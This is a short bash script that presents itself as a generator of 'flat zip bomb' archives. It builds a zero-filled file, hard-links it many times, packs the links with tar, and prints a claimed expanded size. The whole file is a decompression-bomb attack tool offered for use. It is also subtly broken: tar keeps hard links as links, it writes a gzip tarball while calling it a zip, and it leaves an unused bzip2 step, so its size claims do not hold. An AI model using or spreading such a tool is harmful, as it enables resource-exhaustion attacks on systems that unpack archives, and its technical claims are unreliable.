#!/bin/bash

get_file_size() {
    local input=$1
    local size=$(stat -f %z "$input" 2>/dev/null || stat -c %s "$input")
    echo $((size / 1024 / 1024))
}

create_flat_zip_bomb() {
    local requested_size_mb=$1
    local output=$2
    local start_dir=$PWD
    local dummy_size=100
    
    echo "Creating flat zip bomb of ${requested_size_mb}MB..."
    
    work_dir=$(mktemp -d)
    cd "$work_dir" || exit 1
    
    dd if=/dev/zero bs=100M count=1 of=dummy.txt
    
    local num_copies=$((requested_size_mb / dummy_size))
    if [ "$num_copies" -lt 1 ]; then
        num_copies=1
    fi
    
    echo "Creating archive with $num_copies references (each 100MB)..."
    
    bzip2 -9k dummy.txt  
    
    for ((i=1; i<=num_copies; i++)); do
        ln dummy.txt "dummy${i}.txt"
    done
    
    tar czf "$start_dir/$output" dummy*.txt
    
    cd "$start_dir" || exit 1
    rm -rf "$work_dir"
    
    local theoretical_size=$((dummy_size * num_copies))
    echo -e "\nFlat bomb creation complete!"
    echo "----------------------------------------"
    echo "Final archive file: $(ls -lh "$output")"
    echo "Compressed size: $(get_file_size "$output") MB"
    echo "Theoretical extracted size: $theoretical_size MB"
    echo "Number of files: $num_copies"
}

# Check arguments
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 size_mb output_zip"
    echo "Example: $0 1000 flat_bomb.zip (creates 1GB flat zip bomb)"
    exit 1
fi

create_flat_zip_bomb "$1" "$2"

rm -f dummy.txt
